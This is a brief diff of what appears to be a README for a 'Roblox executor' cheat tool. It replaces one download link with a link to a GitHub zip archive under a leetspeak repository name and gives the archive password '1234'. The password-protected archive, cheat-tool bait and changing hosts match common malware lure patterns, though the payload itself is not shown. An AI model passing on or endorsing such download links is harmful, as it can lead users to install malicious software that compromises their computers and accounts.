@@ -1,4 +1,4 @@
-[DOWNLOAD](https://telegra.ph/Executor-Roblox-12-09)    PASSWORD: 1234
+[DOWNLOAD](https://github.com/unoreverse-card1/Robl0x-Wawe-Execut0r/archive/refs/heads/main.zip)    PASSWORD: 1234
 
 ![image](https://github.com/user-attachments/assets/9fb3592b-8215-463e-8487-d21cec1728fe)
 
